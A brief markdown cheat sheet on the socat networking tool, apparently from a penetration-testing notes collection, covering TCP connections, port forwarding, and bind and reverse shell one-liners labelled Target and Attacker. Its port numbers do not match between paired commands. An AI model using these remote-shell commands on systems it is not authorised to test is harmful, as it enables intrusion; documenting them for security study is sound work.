# Socat

**Socat** is an all-purpose networking tool, similar to [Netcat](./netcat.md).
For example, to open a [TCP](../../network/protocols/tcp) connection run

```sh
socat - tcp:localhost:8080
```

The `-` indicates that standard IO should be streamed over the connection.

## Port forwarding

Socat can do port forwarding such as

```sh
socat tcp-listen:8081,fork,reuseaddr tcp:localhost:8080
```

## Bind shell

You can create stable bind shells with socat using

```sh
Target > socat tcp-listen:8081 exec:"bash -li",pty,stderr,sigint,setsid,sane
Attacker > socat file:`tty`,raw,echo=0 tcp:localhost:8085
```

## Reverse shell

Socat can be used to obtain stable reverse shells using

```sh
Attacker > socat file:`tty`,raw,echo=0 tcp-listen:8080
Target > socat exec:"bash -li",pty,stderr,sigint,setsid,sane tcp:localhost:8084
```
